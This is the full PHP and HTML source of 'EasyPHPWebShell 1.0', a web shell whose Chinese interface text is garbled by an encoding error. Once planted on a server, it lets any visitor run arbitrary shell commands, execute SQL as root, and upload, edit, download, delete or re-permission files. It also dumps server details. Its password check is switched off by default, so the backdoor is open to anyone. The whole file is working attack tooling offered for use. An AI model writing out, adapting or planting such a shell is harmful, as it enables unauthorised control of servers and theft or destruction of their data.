
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8ๅจด็็)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, ็นๆตฃ;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php
@set_time_limit(0);
@error_reporting(E_ERROR | E_WARNING | E_PARSE);
@ob_start();
$pagestarttime = microtime();

if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}

/////ๅๆๆ๔ฃ็ผฎ

$chkpassword = 0;//ๆ๔จ๔็ต็ ๆฅ ็

$my_password = "5065338";//็ๅง็็ต็ ,ๆฟกๆchkpasswordๆถบ0,ๅงใค็ๅง็ๆ ๆ.

$cookit_time = 24;//็ๅง็cookieๆๆๆๅ ด(ๅๆตฃ:็ๆถ,ๅจจ:ๆถๆพถฉ24็ๆถ)

//////็ผๆ

?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8ๅจด็็)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, ็นๆตฃ;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php

if($chkpassword == 1){
	@session_start();
	if ($_GET["action"] == "logout") {
		@session_unregister("smy_password");
		@session_destroy();
		@setcookie ("cmy_password","");
		echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
	}
	if($_GET["action"] == "login"){
		if($my_password==$_POST["pmy_password"]){
			@session_register("smy_password");
			$_SESSION["smy_password"] = $my_password;
			@setcookie ("cmy_password",$my_password,time()+(3600*$cookit_time));
			echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
		}
	}
	if (@session_is_registered("smy_password")||isset($_COOKIE["cmy_password"])){
		if (($_SESSION["smy_password"]!=$my_password)&&(!isset($_COOKIE["cmy_password"])||$_COOKIE["cmy_password"]!=$my_password))
			getloginpass();
	}else getloginpass();
}

if(!@get_cfg_var("register_globals")){
    foreach($_GET as $key => $val) $$key = $val;
    foreach($_POST as $key => $val) $$key = $val;
	foreach($_FILES as $key => $val) $$key = $val;
}

if(isset($df_path)){
    if (!file_exists($df_path)) $errordownload = "ๅจโๆง็ๆต ถ"; 
    else {
        $df_name = basename($df_path);
        $df_fhd=fopen($df_path,"rb");
        if($df_fhd==false) $errordownload = "ๆๅฏฎๆๆต ๅ ็ฏ";
        else{
            Header("Content-type: application/octet-stream");
            Header("Accept-Ranges: bytes");
            Header("Accept-Length: ".filesize($df_path));
            Header("Content-Disposition: attachment; filename=".$df_name);
            echo fread($df_fhd,filesize($df_path));
            fclose($df_fhd);
            exit;
        }
    } 
}

if(isset($gotodir)) if($gotodir != "") $dir=$gotodir;

if(!isset($action)) {
    $action = "dir";
    $dir = ".";
}

if(!isset($dir)) $dir = ".";

$rootdir = str_replace("\\\\","/",$_SERVER["DOCUMENT_ROOT"]);

if(isset($abspath)) $dir = gettruepath($dir);
else if(isset($unabspath)){
    $dir = gettruepath($dir);
    if(strstr($dir,$rootdir)) $dir = str_replace("$rootdir",".",$dir);  
    else $dir=".";
}
$rny="<font color=green><b>โ </b></font>";$rnn="<font color=red><b>โ </b></font>";

?>

<SCRIPT LANGUAGE="JavaScript">
function rusuredel(msg,url){
    smsg = "็บญ๔ฎ็ๅ ้ใๆต ถ(็๔ฝ)[" + msg + "]ๅ?";
    if (confirm(smsg)){
        url = url + msg;
        window.location = url;
    } 
}

function rusurechk(msg,url){
    smsg = "ๅฉงๆๆต ถ(็๔ฝ,็ๆง)ๆถบ[" + msg + "],็็ฏพๅใง๔ ๆๆต ถ(็๔ฝ,็ๆง):";
    re = prompt(smsg,msg);
    if (re){
        url = url + re;
        window.location = url;
    }
}
</script>
</head>
<body>

<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" width="100%" bgcolor="#000000" class="stylebtext3">
            ๅจใฃฟๆตฃ่ทจจEasyPHPWebShell 1.0(S8S8ๅจด็็)ใๅ่๔ฒใคบๆต ่ฎณฝ้ๅจ้ๅฏฐๅ๔ๅๆ่๔ดใ
        </td>
    </tr>
    <tr>
        <td align="center" bgcolor="#EEEEEE">
            ๆ๔ๆต ๅป็ต็ก็พๅฏฐ:<?php $stmp =str_replace("\\","/", __FILE__);echo "ใ<a href=\"$HTTP_SERVER_VARS[PHP_SELF]\">$stmp</a>ใ";?>ใ<a href="?action=logout">็่ง๔ซๅจใฉๆตผ็</a>ใ
        </td>
    </tr>
    <tr>
        <td align="center"  bgcolor="#EEEEEE">ใ<a href="?action=dir&dir=.">ๆๆต ๅ๔็</a>ใใ<a href="?action=editfile&dir=<?=urlencode($dir);?>&editfile=<?=urlencode($dir);?>/">ๆๆ๔ผๆๅจ</a>ใใ<a href="?action=sql">ๆ็๔บๆใจ๔ฅ</a>ใใ<a href="?action=shell">Shellๅๆๆค</a>ใใ<a href="?action=env">็๔จขๅ้</a>ใใ<a href="?action=phpinfo">PHP็ปฏ่คปๆทโฏ</a>ใใ<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">ๆใงๆๅญฐ</a>ใ
        </td>
    </tr>
</table>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="100%" bgcolor="#000000" align="center" class="stylebtext3">
<?php if($action == "dir"){?>
	ๆๆต ๅ๔็
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=dir&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;่คฐๅ็๔ฝ:&nbsp;
	<input name="gotodir" type="text" class="style1" value="<?=$dir?>" size="60">&nbsp;
	<input name="gotodirb" type="submit" class="style1" value="็บๅฎ ๆต"><?php if($dir[1] == ':') echo "ใ<a href=\"?action=dir&dir=".urlencode($dir)."&unabspath=1\">็่ง๔ซ็จ<b>็็จฟ๔ผ</b>็บ๔จพๆใง</a>ใ&nbsp;";else echo "ใ<a href=\"?action=dir&dir=".urlencode($dir)."&abspath=1\">็่ง๔ซ็จ<b>็ผ็ตน</b>็บ๔จพๆใง</a>ใ&nbsp;";?>
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=fileup&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;ๆๆต ๆตธๆตผ ๅฐ(็๔ฝ):
	<input name="filedir" type="text" class="style1" value="<?=$dir?>" size="30">&nbsp;ๆ๔็ๆต ถ:
	<input name="userfile" type="file" class="style1" size="30">&nbsp;
	<input name="userfileb" type="submit" class="style1" value="ๆถๆตผ ">
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=filecreate&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;ๆๆฟ็ผๆๆต ถ(็๔ฝ)ๅใฅฝๅ็๔ฝ:&nbsp; 
	<input name="mkname" type="text" value="" size=30 class="style1">&nbsp;
	<input name="mkfileb" type="submit" value="ๆๆฟ็ผๆๆต ถ" class="style1">&nbsp;
	<input name="mkdirb" type="submit" value="ๆๆฟ็ผ็๔ฝ" class="style1">&nbsp;่คฐๅ็๔ฝ็่ต:ใ<b><?php $write = "ๆถๅ๔จ";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "ๅ๔จ";}}echo "$write</b>ใ";?>
	</td>
	</tr>
	</table>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr bgcolor="#000000" class="stylebtext3">
		<td width="25%">ๆๆต ่ทบ</td>
		<td width="40%">ๅฏค่นซๆๅ ด|ๆๅๆท๔่งๅ ด</td>
		<td width="10%">ๆพถัฐ(KB)</td>
		<td width="8%">็ๆง</td>
		<td width="17%">ๆๆตฃ</td>
	</tr>
	<?php
	$filesum=0;$dirsum=0;$color="#EEEEEE";
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(@is_dir("$dir/$lop_fname")){
			$lop_fsize = "-";
			$lop_fcdata = "-";
			$lop_fmdata = "-";
			$lop_foper="-";
			$lop_ftype="-";
			if($lop_fname==".."){
				if($dir == ".") continue;
				$dirb=@dirname($dir);
				if($dir[1] ==':'){
					$dirb = gettruepath($dirb);
					if(strlen($dirb) <=3) $dirb = substr($dirb,0,2);
				}
				$bp="โณ ";
				$lop_fname = "ๆถ็ปพั๔ฝ";
			}else if($lop_fname=="."){
				if($dir == ".") continue;
				$dir[1] ==':'?$dirb = substr(gettruepath($dirb),0,2):$dirb=$lop_fname;
				$bp="โ ";
				$lop_fname = "ๆ ๅญ้ช็๔ฝ";
			}else{
				$lop_fsize = "[DIR]";
				$dirb="$dir/$lop_fname";    
				$lop_fcdata = @date("Y-n-d H:i:s",@filectime("$dirb"));
				$lop_fmdata = @date("Y-n-d H:i:s",@filemtime("$dirb"));
				$lop_ftype= substr(@base_convert(@fileperms($dirb),10,8),-4);
				$bp="โก ";
				$title = "็็ฐๆฟๅใฆๆต ่ทบใ[$lop_fname]";
				$lop_foper= "[<a href=\"ๅ ้ค\" title=\"ๅ ้ใ็ฟ ้ๆๆต ่ทบใ\" onClick=\"rusuredel('$dirb','?action=filedel&dir=$dir&deldir=');return false;\">ๅ </a>|".
							"<a href=\"้ๅ่\" title=\"้ๅ่\" onClick=\"rusurechk('$dirb','?action=filerename&dir=$dir&renamef=$dirb&renamet=');return false;\">้</a>|".
							"<a href=\"ๆ็ฏด\" title=\"ๆ็ฏด\" onClick=\"rusurechk('$dirb','?action=filecopy&dir=$dir&copydirf=$dirb&copydirt=');return false;\">ๆท</a>|".
							"<a href=\"็ๆง\" title=\"ๆท๔็ฐฑๆง\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&ctype=');return false;\">็</a>]";
				$dirsum++;
			}
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">$bp [<a href=\"?action=dir&dir=$dirb\" title = \"ๆฉๅฅ\">$lop_fname</a>]</td>".
							"<td width=\"40%\">[$lop_fcdata|$lop_fmdata]</td>".
							"<td width=\"10%\">$lop_fsize</td>".
							"<td width=\"8%\">$lop_ftype</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
		}
	}
	@closedir($dirs);
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(!@is_dir("$dir/$lop_fname")&&$lop_fname!=".."){
			$lop_ftype= substr(@base_convert(@fileperms("$dir/$lop_fname"),10,8),-4);
			$lop_foper= "[<a href=\"ๅ ้ค\" title=\"ๅ ้ค\" onClick=\"rusuredel('$dir/$lop_fname','?action=filedel&dir=$dir&delfile=');return false;\">ๅ </a>|".
						"<a href=\"้ๅ่\" title=\"้ๅ่\"  onClick=\"rusurechk('$dir/$lop_fname','?action=filerename&dir=$dir&renamef=$dir/$lop_fname&renamet=');return false;\">้</a>|".
						"<a href=\"ๆ็ฏด\" title=\"ๆ็ฏด\" onClick=\"rusurechk('$dir/$lop_fname','?action=filecopy&dir=$dir&copyfilef=$dir/$lop_fname&copyfilet=');return false;\">ๆท</a>|".
						"<a href=\"็ๆง\" title=\"ๆท๔็ฐฑๆง\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&cfile=$dir/$lop_fname&ctype=');return false;\">็</a>|".
						"<a href=\"?action=dir&df_path=$dir/$lop_fname\" title=\"ๆถๆฝ\">ๆถ</a>|".
						"<a href=\"?action=editfile&dir=$dir&editfile=$dir/$lop_fname\" title=\"็ผๆ\">็ผ</a>]";
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">โ  <a href=\"$dir/$lop_fname\" title = \"ๆๆฎชๅ๏ฝ่ๆๅฏฎ\" target=\"_blank\">$lop_fname</a></td>".
							"<td width=\"40%\">[".@date("Y-n-d H:i:s",@filectime("$dir/$lop_fname"))."|".@date("Y-n-d H:i:s",@filemtime("$dir/$lop_fname"))."]</td>".
							"<td width=\"10%\">".@number_format(@filesize("$dir/$lop_fname")/1024,3)."</td>".
							"<td width=\"8%\">".$lop_ftype."</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
			$filesum++;
		}
	}
	@closedir($dirs);
	?>										  
	<tr bgcolor="#000000" class="stylebtext3" align="center">
		<td width="25%" colspan="5">็๔ฝๆฐ:<?=$dirsum?>,ๆๆต ่ตฐ:<?=$filesum?></td>
	</tr>
	</table>      
<?php }else if ($action == "editfile"){?>
	ๆๆ๔ผๆๅจ(่ใง๔ ๆๆต ๆตธ็ๅใฅฐๆๆฟ็ผๆ็ๆต ถ)
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=filesave&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">่คฐๅ็ผๆๆๆต ่ทบ:
			<input name="editfilename" type="text" class="style1" value="<?=$editfile?>" size="30">
			<input name="editbackfile" type="checkbox" value="1" class="style1">็ๆๆพถๆต ่ฅๆต ถ(ๅๆๆต ถ.bak)<br>
			<textarea name="editfiletext" cols="120" rows="25" class="style1"><?php 
				$fd = @fopen($editfile, "rb");
				$fd==false?$readfbuff = "็่ฏฒๆๆต ๅ ็ฏ(ๆ็ๆ๔๔พๅๆๆต ถ).":$readfbuff = @fread($fd, filesize($editfile));
				@fclose( $fd );
				$readfbuff = htmlspecialchars($readfbuff);
				echo "$readfbuff";
			?></textarea><p>
			<input name="editfileb" type="submit" value="ๆๆตค" class="style1">&nbsp;&nbsp;
			<input name="editagainb" type="reset" value="้็ผฎ" class="style1">
			<a href="?action=dir&dir=<?=urlencode($dir);?>">็่ง๔ซๆฉๅๆๆต ่ตต็ๆคค็ธข</a>
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("sql" == substr($action,0,3)){?>
	ๆ็๔บๆใจ๔ฅ
	</td>
	</tr>
	
	<tr>
	<form method="post" action="?action=sql" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			ๆ็๔บๅๆฟ:<input name="sqlhost" type="text" class="style1" value="<?=isset($sqlhost)?$sqlhost:"localhost"?>" size="20">
			็ป๔จฃ:<input name="sqlport" type="text" class="style1" value="<?=isset($sqlport)?$sqlport:"3306"?>" size="5">
			็ใฆๅณฐ:<input name="sqluser" type="text" class="style1" value="<?=isset($sqluser)?$sqluser:"root"?>" size="10">
			็ต็ :<input name="sqlpasd" type="text" class="style1" value="<?=isset($sqlpasd)?$sqlpasd:""?>" size="10">
			ๆ็๔บๅ:<input name="sqldb" type="text" class="style1" value="<?=isset($sqldb)?$sqldb:""?>" size="10"><br>
			<textarea name="sqlcmdtext" cols="120" rows="10" class="style1"><?php 
				if(!empty($sqlcmdtext)){
					@mysql_connect("{$sqlhost}:{$sqlport}","$sqluser","$sqlpasd") or die("ๆ็๔บๆฉๆใฅใ็ฅ");
					@mysql_select_db("$sqldb") or die("้ๆโ็๔บๆพถ่พซ่งฆ");
					$res = @mysql_query("$sqlcmdtext");
					echo $sqlcmdtext;
					mysql_close();
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo isset($sqlcmdb)?($res?"ๆักๆๅ.":"ๆักๆพถ่พซ่งฆ:".mysql_error()):"";?></span><p>
			<input name="sqlcmdb" type="submit" value="ๆัก" class="style1">&nbsp;&nbsp;
			<input name="sqlagainb" type="reset" value="้็ผฎ" class="style1">
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("shell" == substr($action,0,5)){?>
	Shellๅๆๆค
	</td>
	</tr>

	<tr>
		<form method="post" action="?action=shell" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			ๅ่ฅฐ:<select name="seletefunc" class="input">
				<option value="system" <?=($seletefunc=="system")?"selected":"";?>>system</option>
				<option value="exec" <?=($seletefunc=="exec")?"selected":"";?>>exec</option>
				<option value="shell_exec" <?=($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
				<option value="passthru" <?=($seletefunc=="passthru")?"selected":"";?>>passthru</option>
				<option value="popen" <?=($seletefunc=="popen")?"selected":"";?>>popen</option>
			</select>
			ๅๆๆค:<input name="shellcmd" type="text" class="style1" value="<?=isset($shellcmd)?$shellcmd:""?>" size="80">
			<textarea name="shelltext" cols="120" rows="10" class="style1"><?php 
				if(!empty($shellcmd)){
					if($seletefunc=="popen"){
						$pp = popen($shellcmd, 'r');
						echo fread($pp, 2096);
						pclose($pp);
					}else{
						echo $out =  ("system"==$seletefunc)?system($shellcmd):(($seletefunc=="exec")?exec($shellcmd):(($seletefunc=="shell_exec")?shell_exec($shellcmd):(($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
					}
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo get_cfg_var("safe_mode")?"ๆ็ปบ:็นๅใฆฤๅฏฎๆถๅ๔ซ่ฅ ๅจๆัก":"";?></span><p>
			<input name="shellcmdb" type="submit" value="ๆัก" class="style1">&nbsp;&nbsp;
			<input name="shellagainb" type="reset" value="้็ผฎ" class="style1">
			<p>
	</td>
	</form>
	</tr>
	</table>
<?php }else if($action=="phpinfo"){?>
	PHP็ปฏ่คปๆทโฏ
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2"><br><?php phpinfo();
		if(eregi("phpinfo",get_cfg_var("disable_functions"))) echo "<b>phpinfoๅ่ฅๆ๔จ็ปๅงข</b><br>";
	?><br>
	</td>
	</tr>
	</table>
<?php }else if("file" == substr($action,0,4)){?>
	็ปฏ่คปๅจๆฏ
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2">
	<br>
	<?php 
		if($action == "filesave"){
			if(isset($editfileb)&&isset($editfilename)){
				if(isset($editbackfile)&&($editbackfile == 1)) 
					echo $out = @copy($editfilename,$editfilename.".bak")?"็ๆๆพถๆต ่ฅๆต ่ตๅ.<p>":"็ๆๆพถๆต ่ฅๆต ่ตๅ<p>";
				$fd = @fopen($editfilename, "w");
				if($fd == false) echo "ๆๅฏฎๆๆต ถ[$editfilename]้็ฏ.";
				else{
					echo $out=@fwrite($fd,$editfiletext)?"็ผๆๆๆต ถ[$editfilename]ๆๅ!":"ๅๅใฆๆต ่ตๆต ถ[$editfilename]้็ฏ";
					@fclose( $fd );
				}
			}
		}else if($action == "filedel"){
			if(isset($deldir)) {
				echo $out = file_exists($deldir)?(deltree($deldir)?"ๅ ้ใ๔ฝ[$deldir]ๆๅ!":"ๅ ้ใ๔ฝ[$deldir]ๆพถ่พซ่งฆ!"):"็๔ฝ[$deldir]ๆถ็ๅจ!!";
			}else if(isset($delfile)){
				@chmod("$delfile", 0777);
				echo $out = file_exists($delfile)?(@unlink($delfile)?"ๅ ้ใๆต ถ[$delfile]ๆๅ!":"ๅ ้ใๆต ถ[$delfile]ๆพถ่พซ่งฆ!"):"ๆๆต ถ[$delfile]ๆถ็ๅจ!";
			}
		}else if($action == "filerename"){
			echo $out = file_exists($renamef)?(@rename($renamef,$renamet)?"้ๅ่[$renamef]ๆถบ[{$renamet}]ๆๅ":"้ๅ่[$renamef]ๆถบ[{$renamet}]ๆพถ่พซ่งฆ"):"ๆๆต ถ[$renamef]ๆถ็ๅจ!";
		}else if($action =="filecopy") {
			if(isset($copydirf)&&isset($copydirt)){
				echo $out = file_exists($copydirf)?(truepath($copydirt)?(copydir($copydirf,$copydirt)?"ๆ็ฏด็๔ฝ[$copydirf]ๅฐ[$copydirt]ๆๅ":"ๆ็ฏด็๔ฝ[$copydirf]ๅฐ[$copydirt]ๆพถ่พซ่งฆ"):"็๔ ็๔ฝ[$copydirt]ๆถ็ๅใคธๅๅฏคๆดช็ฏ"):"็๔ฝ[$copydirf]ๆถ็ๅจ!";
			}else if(isset($copyfilef)&&isset($copyfilet)){
				echo $out = file_exists($copyfilef)?(truepath(dirname($copyfilet))?(@copy($copyfilef,$copyfilet)?"ๆ็ฏดๆๆต ถ[$copyfilef]ๅฐ[$copyfilet]ๆๅ":"ๆ็ฏดๆๆต ถ[$copyfilef]ๅฐ[$copyfilet]ๆพถ่พซ่งฆ"):"็๔ ็๔ฝๆถ็ๅใคธๅๅฏคๆดช็ฏ"):"ๅฉงๆๆต ถ[$copyfilef]ๆถ็ๅจ!";
			}
		}else if($action == "filecreate"){
			if(isset($mkdirb)){
				echo $out = file_exists("$dir/$mkname")?"[{$dir}/{$mkname}]็ใง๔ฝๅฎธๆญๅจ":(@mkdir("$dir/$mkname",0777)?"็๔ฝ[$mkname]ๅๅฏค็ๅ":"็๔ฝ[$mkname]ๅๅฏคๅใ็ฅ");
			}else if(isset($mkfileb)){
				if(file_exists("$dir/$mkname")) echo "[$dir/$mkname]็ใฆๆต ่ทบๅก็ๅจ";
				else{
					$fd = @fopen("$dir/$mkname", "w");
					if($fd == false) echo "ๅฏค่นซๆๆต ถ[$mkname]้็ฏ.";
					else{
						echo "ๅฏค่นซๆๆต ถ[$mkname]ๆๅ <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($dir)."/".urlencode($mkname)."\"><p>็่ง๔ซ็บๅฎ ๆตๅใงผๆๅจด็ๆคค็ธข</a>";
						@fclose( $fd );
					}
				}
			}
		}else if($action == "filetype"){
			echo $out=@chmod($cfile,base_convert($ctype,8,10))?"ๆๅญ่งๅ!":"ๆๅญ็ฐใ็ฅ!";
		}else if($action == "fileup"){
			echo  $out = @copy($userfile["tmp_name"],"{$filedir}/{$userfile['name']}")?"ๆถๆตผ ๆๆต ถ[{$userfile['name']}]ๆๅ.ๆตฃ็ผฎ:[{$filedir}/{$userfile['name']}]ๅฑ({$userfile['size']})็่.":"ๆถๆตผ ๆๆต ถ[{$userfile['name']}]ๆพถ่พซ่งฆ";
		}else{
			echo "้็๔ชๆๆตใๆฐaction.";
		}
	?>
	<p>
	<a href="?action=dir&dir=<?=urlencode($dir);?>">็่ง๔ซๆฉๅๆๆต ่ตต็ๆคค็ธข</a>
	<p>
	</td>
	</tr>
	</table>

<?php }else if($action=="env"){?>
	็๔จขๅ้&nbsp;&nbsp;<?=$rny?>ๆ๔ฉ&nbsp;&nbsp;<?=$rnn?>ๆถๆ๔ฉ<br>
	</td>
	</tr>
	<?php 
	$sinfo[0] = array("ๆถ็ปๅๅ:",$_SERVER["SERVER_NAME"]);
	$sinfo[1] = array("ๆถ็ปบIP:",gethostbyname($_SERVER["SERVER_NAME"]));
	$sinfo[2] = array("ๆถ็ป่น๔บๅฃ:",$_SERVER["SERVER_PORT"]);
	$sinfo[3] = array("ๆถ็ป็ๅ ด:",date("Y/m/d_h:i:s",time()));
	$sinfo[4] = array("ๆถ็ป่น้ด็ผ:",PHP_OS);
	$sinfo[5] = array("ๆถ็ปบWEBๆๅโณจ",$_SERVER["SERVER_SOFTWARE"]);
	$sinfo[6] = array("PHP็ๆฌ:",PHP_VERSION);
	$sinfo[7] = array("ๅโฝ็ปๆดชด:",intval(diskfreespace(".") / (1024 * 1024).'MB'));
	$sinfo[8] = array("ๆถ็ป้ธฟ๔ฐ็ท",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$sinfo[9] = array("่คฐๅ็ใฆท",get_current_user());
	$sinfo[10] = array("ๆๆพถั็ๅ ็จ:",my_func("memory_limit",1));
	$sinfo[11] = array("ๆๆพถัๆถ๔ธๆตผ ๆๆต ถ",my_func("upload_max_filesize",1));
	$sinfo[12] = array("POSTๆๆพถั๔้",my_func("post_max_size",1));
	$sinfo[13] = array("่ๆ๔ถๆถ",my_func("max_execution_time",1));
	$sinfo[14] = array("็่็ๅ่ฅฐ",my_func("disable_functions",1));

	$ssql[0] = array("MYSQL",my_func("mysql_close",2)); 
	$ssql[1] = array("Oracle",my_func("ora_close",2)); 
	$ssql[2] = array("Oracle 8",my_func("OCILogOff",2)); 
	$ssql[3] = array("OBDC",my_func("odbc_close",2)); 
	$ssql[4] = array("SyBase",my_func("sybase_close",2)); 
	$ssql[5] = array("SQL_Server",my_func("mssql_close",2)); 
	$ssql[6] = array("DBase",my_func("dbase_close",2)); 
	$ssql[7] = array("Hyperwave",my_func("hw_close",2));
	$ssql[8] = array("Postgre_SQL",my_func("pg_close",2));

	$sobj[0] = array("Sessionๆ๔ฉ",my_func("session_start",2));
	$sobj[1] = array("Socketๆ๔ฉ",my_func("fsockopen",2));
	$sobj[2] = array("ๅ็ผโๆต ่ต๔ฉ(Zlib)",my_func("gzclose",2));
	$sobj[3] = array("SMTPๆ๔ฉ",my_func("smtp",2));
	$sobj[4] = array("XMLๆ๔ฉ",my_func("XML Support",3));
	$sobj[5] = array("FTPๆ๔ฉ",my_func("FTP support",3));
	$sobj[6] = array("Sendmailๆ๔ฉ",my_func("Internal Sendmail Support for Windows 4",3));
	$sobj[7] = array("SNMPๆ๔ฉ",my_func("snmpget",2));
	$sobj[8] = array("PDFๆๅฆ๏ฝ๔ฉ",my_func("pdf_close",2));
	$sobj[9] = array("IMAP็้ญ้๔ๆฌขๆ๔ฉ",my_func("imap_close",2));
	$sobj[10] = array("ๅๆง่ฐๆพถ็GD Libraryๆ๔ฉ",my_func("imageline",2));
	$sobj[11] = array("ZENDๆ๔ฉ",my_func("zend_version",2)."(".zend_version().")");

	$sobj[12] = array("ๅ็้ๅจ็จURLๆๅฏฎๆๆต ถ",my_func("allow_url_fopen",2));
	$sobj[13] = array("PREL็็จฟ๔็๔ญณ PCRE",my_func("preg_match",2));
	$sobj[14] = array("ๆๅงใ้็๔งไฟๆฏ",my_func("display_errors",2));
	$sobj[15] = array("่๔ใฅฎๆถๅใฅฑๅ้",my_func("register_globals",2));
	$sobj[16] = array("PHPๆฉ็ๆ็ฐผ",strtoupper(php_sapi_name()));
	?>

	<tr>
	<td align="center" bgcolor="#EEEEEE">
		<table width="600" border="0" cellpadding="0" cellspacing="0"><br>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">ๆถ็ป่ฝฐไฟๆฏ</td></tr>
			<?php 
			for($i=0;$i<15;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sinfo[$i][0]}</td><td>{$sinfo[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">ๆ็๔บๆ๔ฉๆทโฏ</td></tr>
			<?php
			for($i=0;$i<9;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$ssql[$i][0]}</td><td>{$ssql[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">็ผๆต ่ทบๅๆตปๆทโฏ</td></tr>
			<?php
			for($i=0;$i<17;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sobj[$i][0]}</td><td>{$sobj[$i][1]}</td></tr>";
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">่๔ฎๆถๆใงPHP้็ผ๔ๆฐ(ๆพถๆถ๔ๆๆฟ๔ชจ","้ๅ็ฝๅฏฎ)</td></tr>
			<tr bgcolor="#EEEEEE">
			<form method="post" action="?action=env" enctype="multipart/form-data">
				<td colspan="2">็็ฏพๅใฅๆๆฎProgIdๆClassId:
					<input name="envname" type="text" size="50" class="style1" value=<?=isset($envname)?$envname:"";?>> 
					<input name="envnameb" type="submit" value="ๆใง" class="style1">
				</td>
			</form>
			</tr>
			<?php
				if(isset($envname)&&!empty($envname)){
					$envname=explode(",", $envname);
					$i=0;
					while($envname[$i]){
						echo "<tr bgcolor=\"#CCCCCC\"><td colspan=\"2\">ๆใจ๔ฅ[{$envname[$i]}]ๆฟกๆถ:</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_cfg_varๆ็ฐผ</td><td>". my_func($envname[$i],1)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>function_existsๆ็ฐผ</td><td>". my_func($envname[$i],2)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_gpcๆ็ฐผ</td><td>". my_func($envname[$i],3)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_runtimeๆ็ฐผ</td><td>". my_func($envname[$i],4)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Getenvๆ็ฐผ</td><td>". my_func($envname[$i],5)."</td></tr>";	
						$i++;
					}
				}
			?>
		</table><br>
	</td>
	</tr>
	</table>
<?php }else{
	echo "้็๔ชๆๆตใๆฐ</td></tr><tr><td align=\"center\" bgcolor=\"#EEEEEE\"><br><a href=\"?action=dir&dir=".urlencode($dir)."\">็่ง๔ซๆฉๅๆๆต ่ตต็ๆคค็ธข</a><p></td></tr></table>";
}echoend();@ob_end_flush();?>

